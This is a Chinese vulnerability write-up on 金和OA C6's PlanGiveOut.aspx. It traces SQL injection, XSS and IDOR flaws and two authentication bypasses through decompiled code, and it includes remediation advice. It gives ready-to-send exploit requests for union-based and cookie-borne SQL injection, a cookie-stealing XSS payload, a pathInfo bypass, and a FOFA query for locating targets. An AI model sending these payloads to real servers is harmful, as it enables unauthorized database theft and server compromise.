---
title: "金和OA C6 PlanGiveOut.aspx SQL注入漏洞+越权访问IDOR漏洞+XSS漏洞"
source: https://mrxn.net/jswz/jhsoft-PlanGiveOut-planid-httpOID-sqli.html
asset_dir: embedded-base64
---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 PlanGiveOut.aspx 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")、[XSS](https://mrxn.net/tag/XSS "标签：XSS")漏洞、越权访问IDOR漏洞，攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA”

# 漏洞分析

## 攻击链全景

② PlanGiveOut 漏洞(未授权可达)

① 鉴权绕过(二选一)

👤 攻击者(公网·零凭据)

pathInfo 绕过  
请求加 `/x` 后缀  
**零成本**

LoginByURL 日期密钥  
AES Key=当天日期×4  
免密登录

SQL 注入  
planid/httpOID 拼接  
→ 拖库/提权

IDOR 越权  
枚举 planid  
→ 查看他人数据

XSS  
isCopy 反射 / DB字段存储

SQL Server  
new SqlCommand 拼接SQL  
SqlDBOperator.cs

---

## 一、鉴权分析

### 1.1 鉴权方式总览

PlanGiveOut 的鉴权由 **四层**构成,但实际防护极度薄弱:

| 层级 | 机制 | 代码位置 | 实际效果 |
| --- | --- | --- | --- |
| ① web.config | ASP.NET 内置 forms 认证 | `web.config` | 仅要求"已登录",无角色限制 |
| ② Global.asax | 全局鉴权事件 | `Global.cs` | **空实现,无自定义鉴权** |
| ③ 基类 Page | 强制角色/模块校验 | `Page.cs`(`OnLoad`) | **未调用,无强制鉴权** |
| ④ 业务页 | 页面级鉴权 | `PlanGiveOut.cs` 全文 | **无 `RoleCtrl`/`KeyCtrl` 调用** |

放行已登录

空实现·直通

未强制调用

业务逻辑执行

④ PlanGiveOut

Page\_Load 无 RoleCtrl  
ShowPlanInfo 无归属过滤

③ 基类 Page

OnLoad 仅读 UserCode  
RoleCtrl/KeyCtrl 需主动调用

② Global.asax

BeginRequest: {} 空  
AuthenticateRequest: {} 空

① web.config

allow users=\*  
deny users=?  
仅拦截匿名

HTTP 请求  
PlanGiveOut.aspx

⚠️ 漏洞触发

### ① web.config 认证配置

```
<authentication mode="Windows">  <!-- -->
    <forms name="authenticationcookie"  <!-- -->
           loginUrl="JHSoft.Web.CustomQuery/info.aspx"
           protection="All" path="/" timeout="10">
    </forms>
</authentication>
<authorization>
    <allow users="*"></allow>  <!-- 允许所有(已认证)用户 -->
    <deny users="?"></deny>  <!-- 拒绝匿名用户 -->
</authorization>
```

`mode="Windows"` 与 `<forms>` 子节点共存属反常配置,实际由 forms 票据(`authenticationcookie`)生效。`<deny users="?">` 仅拦截**匿名**用户——只要持有任意有效登录态即放行,**不校验角色/模块权限**。

### ② Global.asax 全局鉴权事件为空(`Global.cs`)

```
// JHSoftWare.dll → JHSoftWare.Global(Global.asax.cs)
protected void Application_BeginRequest(object sender, EventArgs e)
{
}   // Global.cs —— 空实现,请求入口阶段无任何检查

protected void Application_AuthenticateRequest(object sender, EventArgs e)
{
}   // Global.cs —— 空实现,认证阶段无任何自定义逻辑
```

`Application_BeginRequest`(请求最早阶段)与 `Application_AuthenticateRequest`(认证阶段)**均为空方法**。系统没有任何自定义鉴权拦截器,鉴权 100% 依赖 ASP.NET 内置机制。

三个已注册 HttpModule(`web.config`)同样不拦截鉴权:

```
// JHSoft.CustomQuery.HttpUploadModule.BeginRequest —— 仅处理上传,其余 return
private void Application_BeginRequest(object sender, EventArgs e)
{
    string text = context.Request.Path.ToLower();
    if (text.IndexOf("uploadfileiframe.aspx") == -1  // :只认上传页
        && text.IndexOf("uploadvideofileiframe.aspx") == -1
        && text.IndexOf("addnewfile.aspx") == -1)
        return;                                            // 非上传页直接放行
    ...
}
// JHWeb.qqfly.Upload.HttpUploadModule.BeginRequest —— 仅处理上传请求体
// JHSoft.Log.LogHttpModule.BeginRequest —— 完全空方法 {}
```

### ③ 基类 `JHSoft.Base.Page` 提供了鉴权方法但未强制调用(`Page.cs`)

```
// JHSoft.Base.dll → JHSoft.Base.Page(所有业务页基类)
public class Page : Page                                    // Page.cs
{
    protected override void OnLoad(EventArgs e)             // Page.cs
    {
        ...
        if (HttpContext.Current.Session["UserCode"] != null)  // Page.cs
        {
            string text2 = this.Session["UserCode"].ToString(); // Page.cs
            ...   // 仅读取用户配置(皮肤等),不做鉴权
        }
        this.OnLoad(e);                                     // Page.cs
    }

    public bool RoleCtrl(string Role1, string Role2)        // Page.cs —— 角色校验(需主动调用)
    {
        if (this.Session["UserCode"] != null)               // Page.cs
            text = this.Session["UserCode"].ToString();
        if (text == "Admin") flag = true;                   // Admin 直接放行
        ...
    }

    public void KeyCtrl(string keyCode)                     // Page.cs —— 模块校验(需主动调用)
}
```

`RoleCtrl`/`KeyCtrl` 是**可选**方法,需业务页**主动调用**才生效。PlanGiveOut **从未调用它们**(全文无 `RoleCtrl`/`KeyCtrl`),所以第 ③ 层形同虚设。

### ④ PlanGiveOut 自身无鉴权(`PlanGiveOut.cs`)

```
// JHSoft.Web.PlanSummarize.dll → JHSoft.Web.PlanSummarize.PlanGiveOut
protected void Page_Load(object sender, EventArgs e)        // PlanGiveOut.cs
{
    ...
    if (this.Session["UserCode"] != null)                   // PlanGiveOut.cs —— 仅"读取",非校验
        this.strUserID = this.Session["UserCode"].ToString(); // PlanGiveOut.cs
    ...
    this.ShowPlanInfo(this.strPlanID);                      // PlanGiveOut.cs —— 直接进入业务逻辑
}
```

`Page_Load` 仅读取 `Session["UserCode"]`(第 212-214 行),**没有用它做任何权限判断**。`strUserID` 取了值却在 `ShowPlanInfo` 中完全未参与 SQL 过滤(详见 2.3 IDOR)。

### 1.2 鉴权绕过

系统存在 **两条独立**的鉴权绕过路径,使 PlanGiveOut 的所有[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")升级为**[未授权](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87 "标签：未授权")可达**。

### 绕过方式 A:pathInfo 鉴权绕过(零成本,全站性)

**现象**(实测):`/PlanGiveOut.aspx` 与 `/PlanGiveOut.aspx/`(带尾斜杠)返回 **302 跳登录**;而 `/PlanGiveOut.aspx/Planselect`、`/PlanGiveOut.aspx/PlanGiveOut`、`/PlanGiveOut.aspx/任意字符` **不触发鉴权,直接响应**。

**根因**:IIS 集成模式 + ASP.NET 4.x 下,带 pathInfo(`.aspx/附加路径`)的 URL 在 `AuthorizeRequest` 阶段的鉴权判定与纯页面 URL 不一致,`<deny users="?">` 规则匹配不到带 pathInfo 的请求。

关键佐证(`web.config`):

```
<pages validateRequest="false" enableEventValidation="false"
       enableViewStateMac="false"></pages>  <!-- 三防护全关 -->
<httpRuntime requestValidationMode="2.0" .../>  <!-- -->
<validation validateIntegratedModeConfiguration="false"/>  <!-- 关闭集成模式校验 -->
```

**关键性质**:绕过与附加路径内容无关,只要存在 `.aspx/yyy` 结构即生效——PlanGiveOut 代码中**无任何 `[WebMethod]`**,因此 `/Planselect`、`/PlanGiveOut` 并非调用特定方法,而是 pathInfo 结构本身让鉴权模块"看不见"该请求需鉴权。由于 `Global.cs`、三个 HttpModule、基类均不拦截 `.aspx/`(1.1 节已逐层确证),此绕过为**全站性**,适用于任意 `.aspx` 页面。

```
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/x   →  绕过 <deny users="?"> ,未授权直达
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx      →  正常鉴权,302 跳登录
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/     →  尾斜杠被规范化,无 pathInfo,302 跳登录
```

### 绕过方式 B:LoginByURL 日期密钥免密登录

**入口**:`Jhsoft.Web.login/LoginByURL.aspx` → `LoginByURL.cs`(`JHSoft.Web.Login.dll`)。

`Decryptstr` 方法用**当天日期**派生 AES 密钥(`LoginByURL.cs`):

```
// LoginByURL.cs
byte[] bytes = Encoding.Default.GetBytes(
    DateTime.Now.ToString("yyyyMMdd") + DateTime.Now.ToString("yyyyMMdd"));
//   IV  = 当天日期重复 2 次,如 "2026072920260729"(16 字节)
byte[] bytes2 = Encoding.Default.GetBytes(
    DateTime.Now.ToString("yyyyMMdd") + DateTime.Now.ToString("yyyyMMdd")
    + DateTime.Now.ToString("yyyyMMdd") + DateTime.Now.ToString("yyyyMMdd"));
//   Key = 当天日期重复 4 次,如 "20260729"×4(32 字节)
aES.CreateKey(bytes2, bytes);   // 用完全可预测的密钥解密登录凭据
```

AES 类(`JHSoft.CustomQuery.dll` → `AES.cs`)是标准 Rijndael,`CreateKey` 直接采用传入 Key/IV,**无 KDF、无加盐**:

```
// AES.cs
public void CreateKey(byte[] keyInfo, byte[] IVInfo)
{
    rij = Rijndael.Create();      // AES.cs
    rij.IV = IVInfo;              // AES.cs —— 直接用传入 IV
    rij.Key = keyInfo;            // AES.cs —— 直接用传入 Key
}
```

**数据流转**:

```
攻击者(已知当天日期)本地计算 Key/IV
   → AES 加密 "username=password=timestamp(当前时间)"
   → GET /Jhsoft.Web.login/LoginByURL.aspx?<Base64密文>
       ↓ LoginByURL.cs  Decryptstr 用【相同日期密钥】解密 → "Yes"
       ↓ LoginByURL.cs  roles.GetUserID(username) 取真实用户ID
       ↓ LoginByURL.cs  签发 FormsAuthenticationTicket(600 分钟有效)
       ↓ LoginByURL.cs  FormsAuthentication.Encrypt → 写 authenticationcookie
       ↓ LoginByURL.cs  CreateSession(text)
       ↓ CreateSession → LoginByURL.cs  Session["UserCode"] = 该用户UserID
   → 攻击者获得有效登录态
```

时间校验仅 ±1 分钟(`LoginByURL.cs`),即时生成即时使用即可,不构成障碍。

攻击者本地(已知服务器当天日期,如 20260729)

服务器 LoginByURL.cs

Decryptstr  
用**相同日期密钥**解密 → 'Yes'

GetUserID  
取真实用户ID

FormsAuthenticationTicket  
有效期 600 分钟

写入 authenticationcookie

CreateSession  
Session['UserCode'] = UserID

日期派生密钥  
Key = 20260729 ×4 = 32字节  
IV = 20260729 ×2 = 16字节  
*AES.cs 直接采用,无 KDF/加盐*

AES 加密  
明文 = username=password=timestamp  
→ Base64

GET /Jhsoft.Web.login/LoginByURL.aspx?<密文>

✅ 获得有效登录态  
可访问 PlanGiveOut

---

## 二、代码分析

### 2.1 入口文件与反编译定位

```
PlanGiveOut.aspx (前台)
   └─ Inherits="JHSoft.Web.PlanSummarize.PlanGiveOut"
        └─ 编译于 JHSoft.Web.PlanSummarize.dll → 反编译得 PlanGiveOut.cs
              └─ 数据访问调用 DBOperatorFactory.GetDBOperator()
                   └─ JHSoft.IDAL.dll → SqlDBOperator(实现类)
```

`Page_Load`(`PlanGiveOut.cs`)从请求取参数、调用 `ShowPlanInfo`:

```
protected void Page_Load(object sender, EventArgs e)
{
    if (this.Request.QueryString["isCopy"] != null)  // —— 反射XSS Source
        this.isreadonly = this.Request.QueryString["isCopy"];  // —— 原样赋值无校验
    ...
    if (this.Request["planid"] != null)  // —— SQL注入 Source
        this.strPlanID = this.Request["planid"].ToString();  // if (this.Session["UserCode"] != null)  // this.strUserID = this.Session["UserCode"].ToString();  // —— 取了但查询不用
    if (this.Request["httpOID"] != null)  // —— 第二个注入 Source
    {
        this.strPlanID = this.Request["httpOID"].ToString();  // —— 覆盖 planid
        this.strHttpOID = this.strPlanID;
    }
    this.ShowPlanInfo(this.strPlanID);  // —— 进入注入 Sink
}
```

### 2.2 反编译关键 DLL — SQL 注入 Sink 追踪

`ShowPlanInfo`(`PlanGiveOut.cs`)将 `strPlanID` **直接字符串拼接**进 SQL:

```
private void ShowPlanInfo(string strPlanID)                 // PlanGiveOut.cs
{
    DBOperator dBOperator = DBOperatorFactory.GetDBOperator();  // empty = " select UserID,username,planyear,... from [plan] left join ...";
    empty = empty + " where planid=" + strPlanID;  // —— 注入点①(数字型)
    empty = empty + " select * from plancontent where planfatherid="
            + strPlanID + " order by plancontent.PlanID asc";  // —— 注入点②(数字型)
    dataSet = dBOperator.ExecSQLReDataSet(empty);  // —— 执行
    ...
    // 二阶注入(来自首次查询结果)
    empty = "select * from PlanContent where PlanContent.PlanFatherID=(";
    empty = empty + " select top 1 PlanID from [Plan] where PlanFlag=" + text3
            + " and PlanYear=" + array[0]
            + " and PlanMonW=" + array[1]
            + " and RegCode='" + text6 + "' and PlanTypeID=" + text2 + ")";  // —— 注入点③
    dataTable = dBOperator.ExecSQLReDataTable(empty);  // }
```

逐层下沉到 `SqlDBOperator`(`JHSoft.IDAL.dll`),确证 **零参数化**:

```
// SqlDBOperator.cs
public override DataSet ExecSQLReDataSet(string QueryString)  // {
    DataSet dataSet = new DataSet();
    ReturnMethord returnResult = ReturnDataSet;
    ExecSQL(QueryString, dataSet, returnResult);  // return dataSet;
}

private object ExecSQLNotInTrans(string QueryString, ...)  // {
    ...
    comm = new SqlCommand(QueryString, conn);  // —— QueryString 即完整SQL
    comm.CommandType = CommandType.Text;  // —— 纯文本命令
    ...
    ReValue = ReturnResult(comm, ReValue);  // }

private object ReturnDataSet(SqlCommand comm, object ReValue)  // {
    SqlDataAdapter val = new SqlDataAdapter(comm);
    ((DataAdapter)val).Fill(ReValue as DataSet);  // —— Fill 支持批处理
    return ReValue;
}
```

**Sink 确证**:`new SqlCommand(QueryString, conn)`直接吞下拼接好的 SQL 字符串,`CommandType.Text`按原始 SQL 解析,`SqlDataAdapter.Fill(DataSet)`执行。**整条链路无任何参数化绑定**。

JHSoft.IDAL → SqlDBOperator.cs

PlanGiveOut.cs

Source ①②  
Request['planid'] / Request['httpOID']  
GET / POST / Cookie 均可

Source ③(二阶)  
DB: PlanFlag / RegCode

取参数  
→ strPlanID

拼接  
where planid={strPlanID}

拼接  
where planfatherid={strPlanID}

ExecSQLReDataSet(empty)

拼接  
where PlanFlag={text3}...RegCode='{text6}'

ExecSQLReDataTable

ExecSQLReDataSet  
ExecSQLReDataTable

ExecSQLNotInTrans

new SqlCommand(QueryString, conn)  
**QueryString = 完整SQL,零参数化**

CommandType = Text

SqlDataAdapter.Fill(DataSet)  
**支持批处理/堆叠**

🗄️ SQL Server  
联合查询 / xp\_cmdshell

### 2.3 存在的漏洞点

#### 漏洞 1:SQL 注入(严重,Critical)

| 注入点 | 行号 | Source | Sink | 类型 |
| --- | --- | --- | --- | --- |
| ① | `PlanGiveOut.cs` | `Request["planid"]` | `ExecSQLReDataSet` | 数字型 |
| ② | `PlanGiveOut.cs` | `Request["planid"]`/`httpOID` | 同上 | 数字型 |
| ③ | `PlanGiveOut.cs` | DB(`PlanFlag`/`RegCode`等) | `ExecSQLReDataTable` | 二阶 |

- **支持方式**:因 `Request["planid"]` 为通用索引器(QueryString → Form → Cookies),**GET / POST / Cookie 三种方式均可注入**。
- **支持手法**:`Fill(DataSet)` 支持批处理(第 246-247 行拼了两条 select,中间无分号即被分入两个 Table),故**联合查询注入与堆叠注入均可**。
- **类型校验在注入之后**:`int.Parse(text4)`在 `ExecSQLReDataSet`**之后**执行,注入已完成,后续异常不影响效果。

### 漏洞 2:存储型 XSS(高)

`PlanGiveOut.aspx` 用 `<%= %>`(`Response.Write` 等价)输出数据库字段,仅 `Replace("\n","<br>")`、**无 HTML 编码**:

| 前台输出(ASPX) | 后端赋值(PlanGiveOut.cs) | DB 来源 |
| --- | --- | --- |
| `<%=PrioPlanContent%>` | `dataTable.Rows[i]["PlanContent"]` | `PlanContent` |
| `<%=strPlanSum%>` | `PlanSumUp` + `Replace("\n","<br>")` | `PlanSumUp` |
| `<%=CurrentPlanContent%>` | `dataSet.Tables[1][...]["PlanContent"]` | `PlanContent` |
| `<%=strLeaderIdea%>` | `LeaderIdea` + `Replace("\n","<br>")` | `LeaderIdea` |

写入入口为计划录入页(`WorkPlanAdd.aspx` 等),写入后被本页未编码输出,触发于任何查看者(含领导/管理员)。

### 漏洞 3:反射型 XSS(高)— `isCopy`

Source(`PlanGiveOut.cs`):

```
if (this.Request.QueryString["isCopy"] != null)  // —— 仅 QueryString
    this.isreadonly = this.Request.QueryString["isCopy"];  // —— 无白名单校验
```

Sink(`PlanGiveOut.aspx`):

```
<body ... onselectstart="return !<%=isreadonly%>">
```

注入 `?isCopy=false;alert(document.cookie)//` → 渲染为 `onselectstart="return !false;alert(...)//"` 触发执行。该参数只能经 **GET**(明确用 `QueryString`)。

### 漏洞 4:越权访问 IDOR(高)

`strUserID`取自 `Session["UserCode"]`,但 `ShowPlanInfo` 的 SQL **完全未用 `strUserID` 做归属过滤**(`where planid=strPlanID`)。任意已登录用户枚举 `planid` 即可越权查看他人/他部门的计划、总结、领导批示。

## 2.4 参数获取方式 / 请求方式分析

漏洞的可利用性首先取决于"参数从哪种 HTTP 请求里取"。ASP.NET 提供了多个取值 API,它们能触达的请求通道**完全不同**。本节逐参数对照源码确证。

#### 2.4.1 ASP.NET 取值 API 的通道差异(原理)

| 取值写法 | 数据来源查找范围 | 可触达的请求通道 |
| --- | --- | --- |
| `Request.QueryString["k"]` | **仅** URL 查询串 | **只能 GET** |
| `Request.Form["k"]` | **仅** POST 请求体 | 只能 POST |
| `Request.Cookies["k"]` | **仅** Cookie 头 | 只能 Cookie |
| `Request["k"]` / `Request.Params["k"]` | **按序查** QueryString → Form → Cookies → ServerVariables | **GET / POST / Cookie / 请求头均可** |

关键区别:`Request["k"]`(通用索引器)**不区分通道**,会按固定顺序遍历所有集合。这意味着只要代码用它取参,攻击者就能选择**最隐蔽**的通道注入(如 Cookie,WAF 常不检查)。

#### 2.4.2 逐参数对照源码

`PlanGiveOut.Page_Load` 中每个 Source 参数的读取方式:

| 参数 | 代码写法 | API 类型 | 可注入通道 | 对应漏洞 |
| --- | --- | --- | --- | --- |
| `planid` | `Request["planid"]` | **通用索引器** | **GET / POST / Cookie / 头** | SQL注入 ①②、IDOR |
| `httpOID` | `Request["httpOID"]` | **通用索引器** | **GET / POST / Cookie / 头** | SQL注入(覆盖 planid) |
| `isCopy` | `Request.QueryString["isCopy"]` | **仅 QueryString** | **只能 GET** | 反射型 XSS |

源码印证(`PlanGiveOut.cs` 的 `Page_Load`):

```
// —— 通用索引器(多通道):SQL 注入面
if (this.Request["planid"] != null)      // GET/POST/Cookie 均可
    this.strPlanID = this.Request["planid"].ToString();
if (this.Request["httpOID"] != null)     // GET/POST/Cookie 均可
    this.strPlanID = this.Request["httpOID"].ToString();

// —— 仅 QueryString(单通道):反射 XSS 面
if (this.Request.QueryString["isCopy"] != null)   // 只能 GET
    this.isreadonly = this.Request.QueryString["isCopy"];
```

> 注意 `planid` 与 `httpOID` 的**覆盖关系**:`httpOID` 在 `planid` **之后**读取,若两者同传,`httpOID` 会**覆盖** `planid`。但两者都走通用索引器,注入通道一致,对攻击者无差别。

#### 2.4.3 各通道的实际利用方式

**① GET(URL 参数)** — 最直接,但最易被 WAF/日志捕获:

```
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/x?planid=1%20union%20select%20... HTTP/1.1
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/x?isCopy=false;alert(1)// HTTP/1.1
```

**② POST(请求体)** — `Request[]` 同样接收,即使前端表单无该字段:

```
POST /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/x HTTP/1.1
Content-Type: application/x-www-form-urlencoded

planid=1 union select ...
```

**③ Cookie 注入** — `Request[]` 会查找 Cookies 集合,**隐蔽性最强**(URL 干净,常绕过只检 URL 的 WAF/IDS):

```
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/x HTTP/1.1
Cookie: planid=1 union select ...;
```

**④ 反射型 [XSS](https://mrxn.net/tag/XSS "标签：XSS") 的限制**:`isCopy` 用 `Request.QueryString`,**只能 GET**。无法通过 POST/Cookie 触发该 XSS。

#### 2.4.4 汇总

取值 API 决定通道

注入通道(取决于取值 API)

限制

多通道

攻击请求

GET URL参数  
*planid / httpOID / isCopy*  
QueryString + Request[]

POST 请求体  
*planid / httpOID*  
Request[] 接收

Cookie 头  
*planid / httpOID*  
Request[] 接收·最隐蔽

Request.QueryString  
= 只能 GET  
**isCopy 专属**

Request[...] 通用索引器  
= GET/POST/Cookie/头  
**planid · httpOID**

漏洞触发

SQL 注入  
planid/httpOID

反射 XSS  
仅 isCopy·仅 GET

**结论**:

- **[SQL 注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL 注入") / IDOR**(`planid`、`httpOID`):走 `Request[]` 通用索引器,**GET、POST、Cookie 三通道均可**。其中 Cookie 注入最隐蔽,是金和 OA 这类老系统(普遍用 `Request[]`)的典型绕 WAF 手法。
- **反射型 XSS**(`isCopy`):走 `Request.QueryString`,**仅 GET 单通道**。
- 结合 1.2 节 pathInfo 绕过,**任一通道均可叠加 `/x` 后缀实现[未授权利用](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87 "标签：未授权利用")**。

### 2.5 结合鉴权绕过的未授权利用

经 1.2 节绕过后,上述漏洞全部**[未授权](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87 "标签：未授权")可达**:

```
GET /JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/x?planid=1 union select ...
    ↑ pathInfo 绕过鉴权(零成本)        ↑ 未授权 SQL 注入
```

或经 LoginByURL 获得登录态后访问 `/PlanGiveOut.aspx?planid=...`。**两条绕过路径均使 PlanGiveOut 的 [SQL 注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL 注入")、IDOR、XSS 降级为未授权可达**,无需任何账号凭据。

---

## 三、修复建议

| 漏洞 | 修复措施 | 关键代码指针 |
| --- | --- | --- |
| SQL 注入 | 改用参数化查询(底层已支持) | `SqlDBOperator.ExecSQLParameterReDataSet`(接 `IDataParameter[]`);`planid`/`httpOID` 入口加 `int.TryParse` |
| pathInfo 绕过 | `Global.asax` 的 `BeginRequest` 拦截 `.aspx/` 路径;或 URL Rewrite;升级 .NET 补丁 | `Global.cs` 当前为空 |
| 存储型 XSS | `<%= %>` 改 `<%: %>`(自动 HtmlEncode) | `PlanGiveOut.aspx` |
| 反射型 XSS | `isreadonly` 服务端计算,不接受 `Request["isCopy"]` | `PlanGiveOut.cs` |
| IDOR | `ShowPlanInfo` 的 WHERE 加 `RegCode=@UserID` 归属校验 | `PlanGiveOut.cs` |
| LoginByURL 绕过 | 密钥不可由日期派生;改随机密钥或 HMAC 签名 | `LoginByURL.cs` |
| 鉴权强化 | 业务页加 `RoleCtrl`/`KeyCtrl`;`Application_AuthenticateRequest` 实现强制校验 | `Page.cs`、`Global.cs` |

---

## 四、漏洞汇总

| # | 漏洞 | 等级 | 利用条件 | 未授权可达 |
| --- | --- | --- | --- | --- |
| 1 | SQL 注入(`planid`/`httpOID`) | 严重 | pathInfo 绕过后**零认证** | ✅ |
| 2 | 二阶 SQL 注入 | 高 | 同上 | ✅ |
| 3 | pathInfo 全站鉴权绕过 | 严重 | 改 URL 加 `/x` | — |
| 4 | LoginByURL 日期密钥绕过 | 严重 | 已知服务器日期 | — |
| 5 | 存储型 XSS | 高 | 触发需他人查看 | — |
| 6 | 反射型 XSS(`isCopy`) | 高 | pathInfo 绕过后未授权 | ✅ |
| 7 | IDOR 越权 | 高 | pathInfo 绕过后未授权 | ✅ |

**核心结论**:`PlanGiveOut.aspx` 存在 SQL 注入、XSS、IDOR 等漏洞,且系统存在 pathInfo 全站鉴权绕过与 LoginByURL 日期密钥绕过两条独立绕过路径,使上述漏洞全部升级为**未授权、零成本可达**,构成从公网直接拖库的 Critical 级风险。

鉴权层

业务漏洞层(经绕过·未授权)

🔥 SQL 注入  
planid 拼接  
→ 拖库/RCE

🔓 IDOR  
枚举 planid  
→ 越权查看

💉 XSS  
isCopy / DB字段  
→ 盗Cookie

🌐 公网  
攻击者

正常请求  
PlanGiveOut.aspx  
→ 302 拦截 ✓

pathInfo 绕过  
PlanGiveOut.aspx/x  
→ 未授权 ✗

LoginByURL 密钥  
日期派生AES  
→ 免密登录 ✗

💥 影响  
数据库泄露 / 服务器控制  
零凭据·从公网直达

# 漏洞复现

```
GET /C6/JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/xxx HTTP/1.1
Host: 
Cookie: planid=1 union all select 1,2,3,4,5,6,7,@@version,9,10,11,12,13-- aa;
```

![](data:image/webp;base64,UklGRkJSAQBXRUJQVlA4WAoAAAAQAAAANwgA8QMAQUxQSP4DAAABylHctm1E7793jrbfAhExAW5NEfl24wWXB+RItt1Ud/VSkQjALiEFH42IyC9FNHxv1ziVhOeJAA7n3RsRE6CobSOJzqJc/v/LIyUikj7jJF2tswIEbM00ieURq+NNAQjamGUNPgpYkIMyGt8BGjT15eYFPEjnJfovAEKlh1YWIELTuzp5ARKyc4fmBUxIvSmyABQab3D/BVSo7tq8AAt5pRHgQr30jRfYhUEADHn2gRhQyGqADCkcYwZjcoMZGOMCNIxHqEGSoga2Qg24Rg0sQw0sPP3Pf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7zn//85z//+c9//vOf//znP//5z3/+85///Oc///nPf/7z/+l//vOf//znP//5z/+zbqhBa9QgogaTogYlqMGOUYMlG8yg4RgzGJNVzIBCfiAGFJIDxIBn/MYLjBcbeIFe4hwtoFx1/1iBumuMMqTAKLe2cpyAKrd3c5SAKve2M4zA2rw/+kcIlOLTLfCBhaPn5jc2YE2WOPzABTiUkmuTDSJgkxofsTJartYZCtCaS62IT1ZQOCAeTgEA0GMGnQEqOAjyAz5tNpdIpCKnoiJxihjwDYlnbvfXW5jP39bmbqqx0mzH9L5qNXKkrbX6+0UT6b/Y/kXj88LJ5x/4Vzy1AfRutP/R2r8d/If8H+Z9OrmXypi1f3/CXt7y1upvOn/0vVj/Wv+J7BX9U/yXqy/+H7q+9L97/Uj+8fqpf9391Pet/VPvM+Q/+r/6z///9z3yvVs/03qU/vH/////7u3/49nj+0//X96vbD///Z/9KP5R/fv7D/k/1+/sX//+jvy/95/vH9//zf+p/snrP5kfaH73/nP+R/ffbH/ifJz1h/yP9t6qfy37x/k/7n/lf/P/gPmb/Sf8P+//jZ6f/Kn/R/Nf/A/IR7A/z395/IX49/q/+1+z37L+aju3+//0/+L9gv3R+yf7X/C/5z/3f4r38/jf+t/kv7p7Y/rf+V/5n+N/Lv7Af59/WP+n/g/bD/f/+r/U/v/6rv4j/kft38An8+/zP7We7p/bf+r/Xf6j92vdb+s/6n/3f6f/c/Ir+vP/i/yXt2f///8/Cv95P///+PiQ/cP////8FC/gaFt8re7czupSr5vpYjSH++tYhFQ+yfT59ocv2HDot1kvO9Lz03y34tHBdQC3eL/hQjMkBMXGZy/XkcwSTUQtzWBoYsoR7S80OX7Dh0vPUxJYlUspsDQ5fsOHS89TFxmcv2HDpeem+XPOQvgtk+dtq+9Zlfuy/v1bea/frUZzeo+RqAXyC1U1IKAvPQkw93N+WqdeOCOERQXmhy/YcOl56mLjM5fsOHS89TFxmcv2HDpeepi4zOX7Dh0vPUxcZnL9hw6XnqYuMygH75selN91erV4dpNSWl75GnLfCNE3FoFl1RGLi74EnxHMfhIGBldKPDtoczs83379zqVtkRe5SwmTeVPck0x4JNZQiDi73rZfkOZVSNlqNFS0J7Zbrg4qaLUktAFE/rMvnKJl56xvyLQR+rGRiqSa1D/GNgwcKrEOb1Z6z5IlVUrWRRzJg/bGnuaCPbR4jRSzuyKdwA3OkPU03XPVOxGrxej7/rBZ5sJjEYmMa822p8X7iqgh4hZUhMjSHw53et3gI+UHF1ij+iyvP/f9tDorzlZ2wt0RXNbgjF+se6RkOxIuOgZJjgyM2xj5I6Cv+F/NfgmNHOb5wOHsSdMDM/CHKyeKAraCBnCx3YczerPWfJEqql47zWbs7vZRxz1o2VEfp8Fy2ytlI2C5+k5fDJ5/wdmeqlUl5oIaSVzW8qRcuoF7nBRul+m5u3jyZF0fs93UJH8O4j3tTblmzexJsI1AhodMq1XVM/m24e+2rMNZcFnuZiSpZ798CGNPr76uJPLgWxKD2JOP974tOLlOZKZZD+r5/61mI8Xnd06I/NSWmma3pHZD7P9zWXnDq8BieOjK9OvvIDmrQKCyIUR8srC5RektA2MleHSMpz0G0fTTwAtKAb3L5KtBHcs7B44qvDqd+jzoaK5bjMGCuZulCvmGFKOiLIC2YhmdRyVeKABFLk